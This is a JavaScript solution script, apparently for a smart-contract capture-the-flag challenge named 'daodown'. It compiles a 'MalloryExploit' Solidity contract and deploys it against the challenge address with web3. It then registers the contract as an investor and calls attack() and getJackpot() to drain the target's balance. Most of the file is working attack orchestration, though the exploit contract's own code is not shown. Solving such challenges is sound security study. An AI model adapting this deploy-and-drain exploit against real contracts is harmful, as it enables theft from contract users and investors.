const fs = require("fs");

const Solution = require("../Solution");
const compile = require("../../utils/compile");
const { DAODOWN_ADDR } = require("../../config/addresses");

class DaodownSolution extends Solution {
    constructor() {
        super(DAODOWN_ADDR);
    }

    compileExploit() {
        console.log("Compiling exploit contract");
        return compile("exploit.sol", fs.readFileSync("./solutions/daodown/exploit.sol", "utf-8"));
    }

    async run() {
        await this.unlock();
        console.log("Running daodown solution...");
        await this.printBalances();
        const { MalloryExploit: exploitContract } = await this.compileExploit();
        console.log("Compiled exploit contract");

        console.log("Deploying exploit...");
        const { abi, evm: { bytecode: { object: bytecode } } } = exploitContract;
        const exploit = new this.w3.eth.Contract(abi);
        const deployedExploit = await exploit.deploy({
            data: bytecode,
            arguments: [this.challengeAddr],
        }).send({
            from: this.myAddr,
            value: 1,
        });
        console.log("Deployed exploit");
        try {
            console.log("Adding exploit as investor");
            const challengeAbi = JSON.parse(fs.readFileSync("./challenges/daodown/EDao.abi", "utf-8"));
            const challengeContract = new this.w3.eth.Contract(challengeAbi, this.challengeAddr);
            await challengeContract.methods.addInvestor(deployedExploit.options.address, false).send({ from: this.myAddr });
            console.log("Exploit added as investor");

            console.log("Starting attack");
            await deployedExploit.methods.attack().send({ from: this.myAddr });
            console.log("Getting jackpot");
            await deployedExploit.methods.getJackpot().send({ from: this.myAddr });
            console.log("Done!");
        } catch (err) {
            console.error(err);
        }
        await this.printBalances();
    }
}

const sol = new DaodownSolution();
sol.run();
